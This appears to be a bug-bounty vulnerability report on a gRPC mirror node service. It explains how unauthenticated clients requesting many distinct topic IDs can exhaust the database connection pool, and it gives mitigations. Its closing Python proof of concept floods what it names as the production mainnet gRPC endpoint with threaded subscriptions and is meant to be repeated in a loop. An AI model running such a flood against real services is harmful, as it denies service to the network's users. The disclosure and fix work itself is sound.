### Title
Unauthenticated gRPC Connection Flood Exhausts HikariCP Connection Pool via Synchronous `entityRepository.findById()` in `topicExists()`

### Summary
`topicExists()` in `TopicMessageServiceImpl` calls `entityRepository.findById()` as a synchronous, blocking JDBC call (wrapped eagerly in `Mono.justOrEmpty()`) on every `subscribeTopic()` invocation for an uncached topic ID. There is no rate limiting or total-connection cap on the gRPC endpoint, and `maxConcurrentCallsPerConnection = 5` is a per-connection limit only. An unprivileged attacker opening many connections and sending requests for distinct valid topic IDs can saturate the HikariCP connection pool, causing all subsequent DB-dependent operations on the node to time out.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` (line 87) calls `topicExists(filter)` before the reactive flux is assembled:

```java
return topicExists(filter)          // line 87
        .thenMany(flux...);
```

`topicExists()` (lines 94–106) executes `entityRepository.findById()` **eagerly and synchronously** — the call happens at assembly time, not subscription time, on the calling thread:

```java
private Mono<?> topicExists(TopicMessageFilter filter) {
    var topicId = filter.getTopicId();
    return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))  // line 96 — blocking JDBC call
        ...
}
```

`EntityRepository.findById()` is a standard Spring Data `CrudRepository` method backed by HikariCP JDBC:

```java
@Cacheable(cacheNames = CACHE_NAME, cacheManager = ENTITY_CACHE, unless = "#result == null")
Optional<Entity> findById(long entityId);   // line 14-15
```

The Caffeine cache (`expireAfterWrite=24h, maximumSize=50000`) uses Spring's `CaffeineCache.get(key, loader)` which is atomic per key — so for a **single** topic ID, only one DB call is made. However, for **N distinct uncached topic IDs**, N simultaneous DB calls are issued, each holding a HikariCP connection for the duration of the query.

**Why existing checks are insufficient:**

| Defense | Why it fails |
|---|---|
| `@Cacheable` | Only prevents repeated calls for the **same** key; N distinct valid topic IDs = N DB calls |
| `maxConcurrentCallsPerConnection = 5` | Per-connection limit only; no cap on number of connections |
| No global rate limiter | Rate limiting (`ThrottleConfiguration`) exists only in the `web3` module, not in `grpc` |
| HikariCP default pool | Spring Boot default is 10 connections; trivially exhausted |

### Impact Explanation
When the HikariCP pool is exhausted, every subsequent operation requiring a DB connection (including the `topicMessageRetriever` historical queries and the safety-check polling) blocks waiting for a connection up to the `connectionTimeout` (default 30 s), then throws `SQLTransientConnectionException`. All new `subscribeTopic()` calls fail. The `applicationTaskExecutor` thread pool also drains as threads block on JDBC acquisition. The node becomes unable to serve any new gRPC subscriptions, satisfying the "≥30% network processing node shutdown" threshold without brute-force packet flooding.

### Likelihood Explanation
Preconditions are minimal: the attacker needs only a list of valid topic IDs (publicly enumerable via the REST API at `/api/v1/topics`) and the ability to open multiple TCP connections to port 5600. No authentication is required. Opening 3 connections and sending 5 concurrent requests per connection (15 total) for 15 distinct uncached topic IDs exceeds the default pool of 10. The attack is repeatable: after connections are closed, the pool recovers, but the attacker can immediately re-flood. On a production network with thousands of valid topics, the attacker has an unlimited supply of cache-miss keys.

### Recommendation

1. **Add a global concurrent-subscription cap** in `GrpcConfiguration` using `serverBuilder.maxConnectionAge()` / `serverBuilder.maxConnections()` or a semaphore guard in `TopicMessageServiceImpl`.
2. **Make `topicExists()` non-blocking**: migrate `EntityRepository` to a reactive R2DBC repository, or offload the blocking call with `.subscribeOn(Schedulers.boundedElastic())` so it does not consume the main executor threads.
3. **Add per-IP or global rate limiting** on `subscribeTopic()` analogous to the `ThrottleConfiguration` in the `web3` module.
4. **Configure HikariCP explicitly** with a `connectionTimeout` and `maximumPoolSize` appropriate for expected load, and expose the `hikaricp_connections_pending` alert threshold (currently 75%) as a hard back-pressure signal.

### Proof of Concept

```python
import grpc, threading
from proto import consensus_service_pb2_grpc, mirror_pb2

# Enumerate valid topic IDs via REST API
topic_ids = fetch_valid_topic_ids("https://mainnet-public.mirrornode.hedera.com/api/v1/topics", limit=200)

def flood(topic_id):
    channel = grpc.insecure_channel("grpc.mainnet.mirrornode.hedera.com:443")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = mirror_pb2.ConsensusTopicQuery(topicID=topic_id, limit=1)
    try:
        list(stub.subscribeTopic(query))  # triggers topicExists() -> findById() -> JDBC
    except Exception:
        pass

# 20 threads × distinct topic IDs → 20 simultaneous JDBC calls → pool(10) exhausted
threads = [threading.Thread(target=flood, args=(tid,)) for tid in topic_ids[:20]]
[t.start() for t in threads]
[t.join() for t in threads]
# Repeat in a loop; node stops accepting new subscriptions
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/EntityRepository.java (L13-15)
```java
public interface EntityRepository extends CrudRepository<Entity, Long> {
    @Cacheable(cacheNames = CACHE_NAME, cacheManager = ENTITY_CACHE, unless = "#result == null")
    Optional<Entity> findById(long entityId);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/CacheConfiguration.java (L47-55)
```java
    @Bean(ENTITY_CACHE)
    @Primary
    CacheManager entityCache(GrpcProperties grpcProperties) {
        int cacheSize = grpcProperties.getEntityCacheSize();
        CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME));
        caffeineCacheManager.setCacheSpecification("recordStats,expireAfterWrite=24h,maximumSize=" + cacheSize);
        return caffeineCacheManager;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L32-33)
```java
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
